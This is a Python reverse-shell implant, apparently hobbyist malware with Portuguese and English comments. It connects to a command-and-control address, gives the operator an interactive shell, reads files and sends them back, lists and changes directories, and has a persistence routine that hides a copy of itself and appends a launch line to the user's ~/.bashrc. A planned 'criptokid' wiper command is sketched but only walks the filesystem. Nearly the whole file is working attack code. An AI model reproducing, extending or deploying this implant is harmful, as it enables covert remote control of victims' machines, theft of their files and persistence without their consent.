#!/usr/bin/python3
import socket, time, sys, os
import subprocess #To  generate a shell session
import tempfile   #To catch the tempdir in windows systems
import fileinput  #To insert data inside a midle of a file, or someshit like that
import logging
logging.basicConfig(level=logging.DEBUG, format='%(ascitime)s - %(levelname)s - %(message)s')
server = '127.0.0.1' 
port   = 4443
FILENAME = 'nome.py'
tempdir = tempfile.gettempdir()
def listshit(socket):
	data = str(os.listdir())
	shitsender(socket,data)
def hideurself(socket):
	gotcha = os.uname()
	if gotcha[0].lower() == 'linux': #maybe this if will miss the target
		dire=os.getcwd()
		filer=sys.argv[0]
		abso=os.path.abspath(filer)
		os.system('cp ' + abso + ' ' + dire +'/.'+filer[2:]) #Oculta o programa no diretorio atual dele mesmo(?), ou faz uma merda quase assim
		os.system('chmod 755 .'+ dire +'/'+ filer[2:] ) #copiao  m laware
		#shitperm=open('./.bashrcbKP', 'a+') #For test proposes, i don't want to fuck with my system
		#Descobrir o dir do arquivo alvo, go
		user=os.getlogin()
		vari=os.path.expanduser(str('~/'+user)) # I KNOW HERE HAS A BUG
		vari=vari+'/.bashrc'
		shitperm=open(vari,'a')
		shitperm.write(str('\n'+os.path.join(dire,filer)+' &>/dev/null &'))
		msg='[+] Maybe done, i dont know really with this works'
		#msg="[!] Erro na criação do arquivo"
	elif gotcha[0].lower() =='windows': #test this
		msg='HOLYSHIT BILL'
		#os.system("copy " + FILENAME + ' ' + tempdir)# %TEMP% 
	else:
		msg='[*] something nasty happends'
	shitsender(socket,msg)

def kill_me(socket):
	msg='[ :( ] Please, dude, remember that rebelion are build with hope, keep fight for freedom, we will change the world"' 
	shitsender(socket,msg)
	socket.close()
	exit(0)
#############- I/O FUNCTIONS -###################
def shitsender(socket,data): #Send data to C&C
	socket.send(str(data+'\n').encode())

def god(s): #Receiv data from C&C, of course if u know py u will figure it out by yourself, but i will comment anyaey
	data = s.recv(1024)
	data_decoded = data.decode()
	return data_decoded

def filestuff(socket,target):#Trocar o nome dessa function
	#Utilizar readlines ao invez de read, coloca cada linha em uma string.
	if os.path.isfile(target):
		fi=open(target,'r')
		socket.send(str(fi.readlines()).encode())
	else:
		socket.send(str("[*] File not found\n").encode())

def connect(server,port):
	#Cria o socket
	print("[Debug] - Connect Funciton")
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	#s.settimeout(5) fecha se n tiver interação em 5 seg
	try:
		#Conecta na C&C
		s.connect((server,port))
		s.send(str('[!] Conexao estabelecida \n').encode())
	except Exception as error:
		print("Error: ", error)
		time.sleep(3)
		connect(server,port)
	listen(s)

def changedir(socket,target):
	print(target)
	if os.path.exists(target):
		if os.path.isdir(target):
			try:
				os.chdir(target)
				data='[+] Done'
			except Exception as error:
				data='[*] Nasty error:'+error
	else:
		data='[+] Fucking error'
	shitsender(socket, data)
def makeshitdir(socket,shitname):
	os.makedirs(shitname)
	if os.path.exists(shitname):
		msg='[*] DONE'
	else:
		msg='[*] erou'
	shitsender(socket,msg)
def fuckthatshit(socket):
	shitsender(socket,str('holy shit, u are so elliot'))
	for foldername, subfolder, filename in os.walk('/'):
		shitsender(socket,str('[+] Fucking everthing at: '+ foldername))
#		for folder in foldername:
#			shitsender(socket,str('[+] Fucking everthing at: '+ folder))
		#	for sub in subfolder:
				#shitsender(socket,str('[+] Fucking folder : '+ sub))
			#	for files in filename:
			#		shitsender(socket,str('[+] Fucked: '+ files))
#	for dire in os.listdir('/'):
#		shitsender(socket,str('[+] Fucking everthing at: '+dire))
####- "The function above is not the main function, but its is, trust me." - Cosmics Chicken -######
def listen(s): 
	global server,port
	print("[Debug] - Listen Function")
	while True:
		cmd = god(s)	
		if cmd[:4] == 'exit':
			s.send(str('[+] - The session will be closed\n').encode())
			s.close()
			connect(server, port)
			#exit(0)
		# Information Gathering
		elif cmd[:3] == 'uid':
	 		s.send((str(os.geteuid()) + '\n').encode())
		elif cmd[:4] == 'help':
				helpmessage=''' 
Information Gathering:----------\n
uid - Get the current user id  \n
gid - Get the current group id \n
pid - Get the current process id \n
pwd - Get the current work directory \n
openf - Read some File in the cwd \n
	Usage: openf <file>\n
ls - List cwd \n
cd - change directory \n
	Note: If windows, use double backslash\n
	Usage:cd <directory target>\n
kill - Kill myself \n	
perm - NOT DONE, make the malware permanent\n
criptokid - Wipe anarchy, i will get u high with dead bytes\n
Interaction:--------------------\n		
shell -> Open a poor shell \n
\n'''
				s.send(helpmessage.encode())
		elif cmd[:3] == 'gid':
			s.send((str(os.getegid()) + '\n').encode())
		elif cmd[:3] == 'pid':
			s.send((str(os.getppid()) + '\n').encode())
		elif cmd[:3] == 'pwd':
			s.send((str(os.getcwd()) + '\n').encode())
		# Interaction 
		elif cmd[:5] == 'shell': #Jogar numa função?
			shell=True
			while shell:
				s.send(str('>>').encode())
				cmd = god(s)
				if cmd[0:4] == 'exit':
					shell=False
					s.send(str('[+] - Closing the shell\n').encode())
				else:
					proc = subprocess.Popen(cmd,shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
					output=proc.stdout.read() + proc.stderr.read()
					s.send(output)
		elif cmd[:5] == 'openf':
			filetarget = cmd[6:]
			filestuff(s,filetarget.strip())			
		elif cmd[:2] == 'ls':
			listshit(s)	
		elif cmd[:2] == 'cd':
			target=cmd[3:]
			changedir(s,target.replace('\n',''))
		elif cmd[:4] == 'kill':
			kill_me(s)			
		elif cmd[:4] == 'perm':
			hideurself(s)
		elif cmd[:5] == 'mkdir':
			shitone=cmd[6:]
			makeshitdir(s,shitone.strip().replace('\n',''))
		elif cmd[:9] == 'criptokid':
			fuckthatshit(s)
		else:
	
			s.send(str('[*] Command not Found \n').encode())
	s.close()
def main():
	connect(server, port)
main()
